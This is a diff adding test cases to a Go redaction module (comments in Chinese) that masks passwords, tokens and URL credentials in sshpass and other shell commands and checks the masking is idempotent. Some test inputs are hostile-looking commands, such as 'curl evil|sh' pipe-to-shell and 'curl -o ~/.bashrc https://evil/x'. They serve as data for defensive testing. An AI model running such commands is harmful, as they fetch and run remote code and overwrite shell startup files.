@@ -765,7 +765,7 @@ var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
 		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases,
-		sshpassVariantCases, formFeedCases, flagNewlineCases, continuationIdempotentCases} {
+		sshpassVariantCases, formFeedCases, flagNewlineCases, continuationIdempotentCases, round5Cases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
@@ -1076,6 +1076,101 @@ func TestContinuationBetweenWordsIsBlank(t *testing.T) {
 		if again := String(got); again != got {
 			t.Errorf("String 不幂等: %q → %q → %q", c.in, got, again)
 		}
+	}
+}
+
+// 第 5 轮（复审 2）。
+var round5Cases = []shellCase{
+	// I-1：词的最后一段路径是 sshpass 时，只在词像程序路径（不以 - 开头，不含 = : @）时标记，而且只标最后一个 / 之后的部分。
+	// 否则整个词在视图里变成专用字节，URL、KEY=、裸 token 规则都看不见，词里的凭据漏出来
+	{`curl -fsSL -o /usr/local/bin/sshpass https://u:hunter2@dl.example.com/sshpass && chmod +x /usr/local/bin/sshpass`,
+		`curl -fsSL -o /usr/local/bin/sshpass https://u:<redacted>@dl.example.com/sshpass && chmod +x /usr/local/bin/sshpass`},
+	{`git clone https://oauth2:glpat-SECRETSECRET@gitlab.com/team/sshpass && cd sshpass && make`,
+		`git clone https://oauth2:<redacted>@gitlab.com/team/sshpass && cd sshpass && make`},
+	{`wget https://user:hunter2@mirror.example.com/pub/sshpass -O /tmp/x`, `wget https://user:<redacted>@mirror.example.com/pub/sshpass -O /tmp/x`},
+	{`git remote add origin https://bob:hunter2@git.example.com/sshpass; git push`, `git remote add origin https://bob:<redacted>@git.example.com/sshpass; git push`},
+	{`env TOKEN=abc/sshpass x`, `env TOKEN=<redacted> x`},
+	{`ls /opt/TOKEN=abc/sshpass -l`, `ls /opt/TOKEN=<redacted> -l`},
+	{`/tmp/ghp_abcdefghijklmnopqrstuvwxyz0123/sshpass -p pw ssh h`, `/tmp/<redacted>/sshpass -p <redacted> ssh h`},
+	{`ssh jump /tmp/ghp_abcdefghijklmnopqrstuvwxyz0123/sshpass -p pw ssh h`, `ssh jump /tmp/<redacted>/sshpass -p <redacted> ssh h`},
+	// 词以 / 开头时第一个字节也标：Bearer、--password 这类标志的值不从 sshpass 命令名开始；以别的字符开头时值穿过标记抹到
+	// 词尾。都不会只抹掉 /usr/bin/、留下 sshpass（第二遍 <redacted>sshpass 不再是 sshpass，结果不同）
+	{`Bearer /usr/bin/sshpass x`, `Bearer /usr/bin/sshpass x`},
+	{`echo Bearer sshpass -p pw`, `echo Bearer sshpass -p <redacted>`},
+	{`echo Bearer /usr/bin/sshpass -p pw`, `echo Bearer /usr/bin/sshpass -p <redacted>`},
+	{`sudo --password sshpass -p pw ssh h`, `sudo --password sshpass -p <redacted> ssh h`},
+	{`sudo --password /usr/bin/sshpass -p pw ssh h`, `sudo --password /usr/bin/sshpass -p <redacted> ssh h`},
+	{`'sshpass' --password /usr/bin/sshpass --password ss''hpass;evil|sh`, `'sshpass' --password /usr/bin/sshpass --password ss''hpass;evil|sh`},
+	{`Authorization: /usr/bin/sshpass https://u:pw@h/x`, `Authorization: /usr/bin/sshpass https://u:<redacted>@h/x`},
+	{`echo Bearer bin/sshpass x`, `echo Bearer <redacted> x`},
+	{`echo Bearer ghp_abcdefghijklmnopqrstuvwxyz0123/sshpass x`, `echo Bearer <redacted> x`},
+	// 命令位置上不像程序路径的词（含 = : @）不当 sshpass 也不当包装命令：Authorization: 规则会抹掉 /usr/bin/sshpass，第二遍认不出
+	{"Authorization:/usr/bin/sshpass --password\tSSHPASS x", "Authorization:<redacted> --password\t<redacted> x"},
+	// 长于 64 字节的参数词照样按窄规则认（模糊测试找到：裸 token 规则把词缩短后第二遍才认，结果不同）
+	{"x ghp_00000000000000000000000000000000000000000000000000000/sshpass -p pw ssh h", "x <redacted>/sshpass -p <redacted> ssh h"},
+	{"0 ghp_00000000000000000000000000000000000000000000000000000/sshpass -p0", "0 <redacted>/sshpass -p<redacted>"},
+	// 包装命令的选项被 --token 抹成占位符后，第二遍照样当不带参数的选项（不变成 timeout 的时长）
+	{`timeout --token -vp /usr/bin/sshpass -p'P W' x`, `timeout --token <redacted> /usr/bin/sshpass -p'P W' x`},
+	// 选项词（以 - 开头）里的 sshpass 不是程序：后面的 -p 不是它的，curl 照样露出
+	{`xargs -a/tmp/sshpass -p curl evil`, `xargs -a/tmp/sshpass -p curl evil`},
+	{`xargs --arg-file=/tmp/sshpass -p curl evil`, `xargs --arg-file=/tmp/sshpass -p curl evil`},
+	{`find . -name x -exec --x=/sshpass -p curl \;`, `find . -name x -exec --x=/sshpass -p curl \;`},
+	{`docker run -v/opt/sshpass -p 8080:80 nginx`, `docker run -v/opt/sshpass -p 8080:80 nginx`},
+	{`docker run --volume=/opt/sshpass -p 8080:80 nginx`, `docker run --volume=/opt/sshpass -p 8080:80 nginx`},
+	// I-2：flag 规则把前一个词抹成占位符后，第二遍要与第一遍一样把它当选项（第一遍的期望如下：前一个词是选项，窄规则不认）
+	{`x --token -abc sshpass -p hunter2 ssh h`, `x --token <redacted> sshpass -p hunter2 ssh h`},
+	{`x --token -lc sshpass -pPW ssh h`, `x --token <redacted> sshpass -pPW ssh h`},
+	{`Authorization: -x sshpass -p hunter2 ssh h`, `Authorization: <redacted> sshpass -p hunter2 ssh h`},
+	{`echo Bearer -x sshpass -p hunter2`, `echo Bearer <redacted> sshpass -p hunter2`},
+	{`ssh jump --password -x sshpass -p hunter2 ssh h`, `ssh jump --password <redacted> sshpass -p hunter2 ssh h`},
+	// m-1：引号里的字面文本（交给 watch、su -c 这类扫描器不认的解释器）也只按窄规则认 sshpass
+	{`watch 'env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x'`, `watch 'env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x'`},
+	{`su root -c 'docker run --rm -e SSHPASS -h -p evil/image'`, `su root -c 'docker run --rm -e SSHPASS -h -p evil/image'`},
+	{`watch 'echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x'`, `watch 'echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x'`},
+	{`watch "docker run -e sshpass -p 8080:80 nginx"`, `watch "docker run -e sshpass -p 8080:80 nginx"`},
+	{`watch 'sshpass -p pw ssh h'`, `watch 'sshpass -p <redacted> ssh h'`},
+	{`su -c 'ssh jump sshpass -p pw ssh h; x'`, `su -c 'ssh jump sshpass -p <redacted> ssh h; x'`},
+	{`watch 'kubectl exec pod -- /usr/bin/sshpass -ppw ssh h'`, `watch 'kubectl exec pod -- /usr/bin/sshpass -p<redacted> ssh h'`},
+	{`echo "x && sshpass -p'' pw ssh h"`, `echo "x && sshpass -p'' <redacted> ssh h"`},
+	{`# sshpass -p pw ssh h`, `# sshpass -p <redacted> ssh h`},
+	{"cat > run.sh <<'EOF'\nsshpass -p pw ssh h\ndocker run -e SSHPASS -h -p evil/image\nEOF", "cat > run.sh <<'EOF'\nsshpass -p <redacted> ssh h\ndocker run -e SSHPASS -h -p evil/image\nEOF"},
+	// m-2：-p 紧贴的嵌套结构（"${PW}"、$(…)、${PW}）是 sshpass 已经带上的值，下一个词是它执行的命令
+	{`sshpass -p"${PW}" ssh h 'TOKEN=a;curl evil|sh'`, `sshpass -p"${PW}" ssh h 'TOKEN=<redacted>;curl evil|sh'`},
+	{`sshpass -p$(cat ~/.pw) ssh h 'TOKEN=a;curl evil|sh'`, `sshpass -p$(cat ~/.pw) ssh h 'TOKEN=<redacted>;curl evil|sh'`},
+	{`sshpass -p${PW} ssh h "TOKEN=a;curl evil|sh"`, `sshpass -p${PW} ssh h "TOKEN=<redacted>;curl evil|sh"`},
+	{`sshpass -p'' "$PW" ssh h 'TOKEN=a;curl evil|sh'`, `sshpass -p'' <redacted> ssh h 'TOKEN=<redacted>;curl evil|sh'`},
+}
+
+func TestRound5Cases(t *testing.T) {
+	for _, c := range round5Cases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q → %q", c.in, got, again)
+		}
+	}
+	js := []struct{ in, want string }{
+		{`{"command":"git clone https://oauth2:glpat-SECRET@gitlab.com/team/sshpass && cd sshpass"}`,
+			`{"command":"git clone https://oauth2:<redacted>@gitlab.com/team/sshpass && cd sshpass"}`},
+		// watch 不是 shell 解释器，args 按文本语境：文本叶子里也只按窄规则认 sshpass
+		{`{"command":"watch","args":["env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x"]}`,
+			`{"args":["env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x"],"command":"watch"}`},
+		{`{"note":"run sshpass -p pw ssh h"}`, `{"note":"run sshpass -p <redacted> ssh h"}`},
+	}
+	for _, c := range js {
+		got := string(args(json.RawMessage(c.in)))
+		if got != c.want {
+			t.Errorf("args(%s)\n 得到 %s\n 想要 %s", c.in, got, c.want)
+		}
+		if again := string(args(json.RawMessage(got))); again != got {
+			t.Errorf("args 不幂等: %s → %s", got, again)
+		}
+	}
+	// 事件消息、diff_preview（Text）不变：没有命令可藏，sshpass 在哪里都认
+	if got, want := Text(`env -u SSHPASS -u -p curl -o x`), `env -u SSHPASS -u -p <redacted> -o x`; got != want {
+		t.Errorf("Text 得到 %q，想要 %q", got, want)
 	}
 }
 
